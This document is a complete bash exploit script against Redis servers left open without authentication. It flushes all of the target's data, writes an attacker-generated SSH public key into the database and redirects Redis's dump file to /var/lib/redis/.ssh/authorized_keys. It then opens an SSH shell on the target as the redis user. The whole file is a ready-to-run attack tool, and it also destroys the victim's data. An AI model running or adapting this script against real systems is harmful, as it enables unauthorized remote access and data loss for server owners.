#!/bin/bash

# Redis SSH Key Upload
# CVE: --
# Exploit author: Victor Zhu
# https://medium.com/@Victor.Z.Zhu/redis-unauthorized-access-vulnerability-simulation-victor-zhu-ac7a71b2e419
# Bash script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

RANDOM_STR=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)
KEY_TMP_PATH="$HOME/.ssh/$RANDOM_STR"
REDIS_PREFIX="redis-cli -h"

for i in "$@"
do
case $i in
    --rhost=*)
    RHOST="${i#*=}"
    ;;
    *)
    ;;
esac
done

key_generating () {
    echo " [*] Generating SSH Keys in $HOME/.ssh/" 
    
    ssh-keygen -t rsa -f $KEY_TMP_PATH -q -N ""
    (echo $'\r\n'; cat $KEY_TMP_PATH.pub; echo  $'\r\n') > $KEY_TMP_PATH.txt
    
    echo " [*] Done, key successfully generated: $KEY_TMP_PATH and $KEY_TMP_PATH.pub"
}

send_key () {
    
    echo " [*] Sending your SSH keys to the Redis..."
    
    $REDIS_PREFIX $RHOST flushall > /dev/null 2>&1
    cat $KEY_TMP_PATH.txt | $REDIS_PREFIX $RHOST -x set s-key > /dev/null 2>&1
    
    echo " [*] Done!"
}

redis_communication () {

    echo " [*] Configuring Redis to store your SSH Keys..."
    
    $REDIS_PREFIX $RHOST CONFIG SET dbfilename "backup.db" > /dev/null 2>&1
    $REDIS_PREFIX $RHOST CONFIG SET dir /var/lib/redis/.ssh/ > /dev/null 2>&1
    $REDIS_PREFIX $RHOST CONFIG SET dbfilename "authorized_keys" > /dev/null 2>&1
    $REDIS_PREFIX $RHOST save > /dev/null 2>&1
    
    echo " [*] Done!"
}

ssh_connection () {
    
    echo " [*] Getting Redis shell..."
    
    ssh -i $KEY_TMP_PATH -q redis@$RHOST
}

# main
echo " [>] Redis SSH Key Upload"
echo " [*] Shell script exploit author: nullarmor"
    
key_generating
send_key
redis_communication
ssh_connection
